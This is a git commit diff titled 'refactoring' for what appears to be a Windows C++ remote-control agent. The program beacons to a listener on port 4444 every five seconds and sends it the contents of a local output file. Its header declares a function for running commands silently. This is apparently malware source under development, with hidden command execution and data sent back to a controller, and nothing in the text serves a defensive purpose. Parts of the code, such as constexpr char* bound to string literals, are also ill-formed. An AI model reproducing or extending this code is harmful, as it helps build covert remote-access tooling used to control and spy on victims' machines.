ca8b9a50491ce4edae9acc150be00636c589b66a
kkups <kajtekkups@gmail.com>
2025-04-26 14:19:41 +0200

    refactoring

--- include/connection.hpp
+++ include/connection.hpp
@@ -8,10 +8,10 @@
 #include <iostream>
 
 
-#define SERVER_IP "127.0.0.1"  // The server's IP address (localhost for testing)
-#define SERVER_PORT 4444        // The server's port
-#define BUF_SIZE 1024           // Size of the buffer to receive the server's response
-#define RECEIVE_FAILED "fail"
+constexpr char* SERVER_IP{"127.0.0.1"};
+constexpr int SERVER_PORT{4444};
+constexpr int BUF_SIZE{1024};     // Size of the buffer to receive the server's response
+constexpr char* RECEIVE_FAILED{"fail"};
 
 void create_silent_cmd(const std::string& command);
 
--- main.cpp
+++ main.cpp
@@ -8,27 +8,22 @@
 
 #include <windows.h>
 
-#define ACTKNOGLAGEMENT "act"
-
+static constexpr char* acknowledgement{"act"};
+static constexpr int intervalSeconds{5}; // Interval for sending requests (in seconds)
+std::ifstream buffor_file("text.txt");
 
 int main() {
-    const std::string command = "cmd.exe /c echo \"Hello, invisible world!\" >> text.txt";
     std::string result;
     std::string received;
 
-    int intervalSeconds = 5;  // Interval for sending requests (in seconds)
-
-
     while (true) {     
-
-        std::ifstream file("text.txt");  
-        if (!file.is_open()) {            
-            // Send request to the server at intervals
-            received = sendRequest(ACTKNOGLAGEMENT);
+        if (!buffor_file.is_open()) {            
+            received = sendRequest(acknowledgement);
         } else{
             std::stringstream buffer;
-            buffer << file.rdbuf();  // Read the entire content of the file into buffer
+            buffer << buffor_file.rdbuf();
             std::string send = buffer.str();
+
             received = sendRequest(send);
         }
         
@@ -40,6 +35,5 @@ int main() {
         // Wait for the next interval
         std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));
     }
-
     return 0;
 }
